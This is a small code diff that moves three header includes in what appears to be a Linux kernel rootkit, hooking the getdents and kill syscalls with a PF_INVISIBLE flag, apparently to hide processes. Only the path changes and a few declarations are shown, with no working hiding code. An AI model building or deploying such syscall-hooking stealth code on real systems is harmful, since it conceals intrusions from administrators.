@@ -13,9 +13,9 @@
 
 #define PF_INVISIBLE 0x10000000
 
-#include "../hooking.h"
-#include "h_getdents.h"
-#include "h_kill.h"
+#include "../../include/hooking.h"
+#include "../../include/h_getdents.h"
+#include "../../include/h_kill.h"
 
 sysfun_t orig_getdents;
 sysfun_t orig_getdents64;
